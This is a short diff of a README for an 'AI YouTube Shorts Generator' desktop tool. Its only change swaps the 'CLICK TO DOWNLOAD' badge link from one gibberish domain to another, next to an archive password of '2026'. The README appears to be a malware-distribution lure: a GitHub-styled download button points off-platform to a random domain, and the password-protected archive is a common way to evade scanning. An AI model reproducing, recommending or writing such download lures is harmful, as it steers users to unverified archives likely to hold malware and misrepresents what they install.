@@ -1,6 +1,6 @@
 # AI YouTube Shorts Generator
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/AI-YouTube-Shorts-Generator)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://fghtfghjfdjfdj.com/AI-YouTube-Shorts-Generator)
 > #### Archive password: `2026`
 
 An AI-powered desktop tool that automatically turns long videos and text prompts into ready-to-publish YouTube Shorts with captions, voiceover, and vertical formatting.
